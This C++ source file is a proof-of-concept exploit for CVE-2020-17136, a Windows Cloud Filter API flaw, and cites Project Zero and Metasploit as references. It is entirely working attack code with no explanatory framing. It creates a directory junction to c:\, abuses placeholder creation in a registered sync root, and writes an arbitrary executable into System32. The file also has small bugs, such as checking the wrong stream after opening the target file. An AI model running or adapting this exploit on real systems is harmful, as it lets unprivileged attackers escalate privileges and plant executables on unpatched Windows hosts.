
#include <windows.h>
#include <iostream>
#include <fstream>
#include <atlstr.h>
#include <cfapi.h>
using namespace std;

#pragma comment(lib, "CldApi.lib")

/** 
 References:
 https://bugs.chromium.org/p/project-zero/issues/detail?id=2082
 https://attackerkb.com/topics/1yvp3hVNSN/cve-2020-17136
 https://github.com/ParrotSec/metasploit-framework/blob/3d4c0f5beee4e2b84af53f01cc17ea621406f6e4/external/source/exploits/CVE-2020-17136/POC_CloudFilter_ArbitraryFile_EoP/Program.cs

 */
CString SyncRoot = L"c:\\windows\\temp\\";
CString TargetFileName = L"symbol_c\\Windows\\system32\\test\\aaa.exe";
CString SourceFileName = L"c:\\windows\\temp\\1.exe";
int main()
{
    ifstream fs;
    ofstream fsTarget;
    DWORD SourceFileSize = 0;
    CF_CONNECTION_KEY key = {0};
    HRESULT hRet = S_OK;
  
    do
    {
        system("mklink /J c:\\windows\\temp\\symbol_c c:\\");

        fs.open(SourceFileName, ifstream::binary|ios::in);
        if (fs.is_open() == FALSE)
        {
            cout << "Open source file failed! error=" << GetLastError() << endl;
            break;
        }

        // Obtain FileSize.
        fs.seekg(0, ios::end);
        SourceFileSize = fs.tellg();
        fs.clear();
        fs.seekg(0, ios::beg);

        CF_SYNC_REGISTRATION CfSyncRegistration = { 0 };
        CfSyncRegistration.StructSize = sizeof(CF_SYNC_REGISTRATION);
        CfSyncRegistration.ProviderName = L"FFE4";
        CfSyncRegistration.ProviderVersion = L"1.0";
        CfSyncRegistration.ProviderId = { 0xf4d808a4, 0xa493, 0x4703, { 0xa8, 0xb8, 0xe2, 0x6a, 0x7, 0x7a, 0xd7, 0x3b } };

        CF_SYNC_POLICIES CfSyncPolicies = { 0 };
        CfSyncPolicies.StructSize = sizeof(CF_SYNC_POLICIES);
        CfSyncPolicies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
        CfSyncPolicies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
        CfSyncPolicies.InSync = CF_INSYNC_POLICY_NONE;
        CfSyncPolicies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

        hRet = CfRegisterSyncRoot(SyncRoot, &CfSyncRegistration, &CfSyncPolicies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
        if (!SUCCEEDED(hRet))
        {
            CfUnregisterSyncRoot(SyncRoot);
            cout << "CfRegisterSyncRoot failed! error=" << GetLastError() << endl;
            break;
        }

        CF_CALLBACK_REGISTRATION CbRegistration[1] = {};
        CbRegistration[0].Callback = NULL;
        CbRegistration[0].Type = CF_CALLBACK_TYPE_NONE;


        hRet = CfConnectSyncRoot(SyncRoot, CbRegistration, NULL, CF_CONNECT_FLAG_NONE, &key);
        if (!SUCCEEDED(hRet))
        {
            CfDisconnectSyncRoot(key);
            cout << "CfConnectSyncRoot failed! error=" << GetLastError() << endl;
            break;
        }
        cout << "key:" << key.Internal << endl;

        CF_PLACEHOLDER_CREATE_INFO CfPlaceholderCreateInfo[1] = {0};
        CfPlaceholderCreateInfo[0].RelativeFileName = TargetFileName;
        CfPlaceholderCreateInfo[0].FsMetadata.FileSize.QuadPart = SourceFileSize;
        CfPlaceholderCreateInfo[0].FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
        SYSTEMTIME st;
        GetSystemTime(&st);
        SystemTimeToFileTime(&st, (FILETIME*)&CfPlaceholderCreateInfo[0].FsMetadata.BasicInfo.CreationTime.QuadPart);
        CfPlaceholderCreateInfo[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
        CfPlaceholderCreateInfo[0].FileIdentity = TargetFileName;
        CfPlaceholderCreateInfo[0].FileIdentityLength = TargetFileName.GetLength();

        DWORD Processed = 0;
        hRet = CfCreatePlaceholders(SyncRoot, CfPlaceholderCreateInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &Processed);
        if (!SUCCEEDED(hRet))
        {
            if (GetLastError() == 0x0000017c)
            {
                cout << "The system is patched."<<GetLastError() << endl;
                break;
            }
            else
            {
                cout << "CfCreatePlaceholders failed! error=" << GetLastError() << endl;
            }
            break;
        }
        // write file
        fsTarget.open(SyncRoot + TargetFileName, ifstream::binary|ios::out);
        if (fs.is_open() == FALSE)
        {
            cout << "Open Target file failed! error=" << GetLastError() << endl;
            break;
        }
        
        char* buffer = new char[SourceFileSize]();
        if (buffer)
        {
            fs.read(buffer, SourceFileSize);
            fsTarget.write(buffer, SourceFileSize);
            fs.close();
            fsTarget.close();
            cout << "Done" << endl;
        }
    } while (false);
}
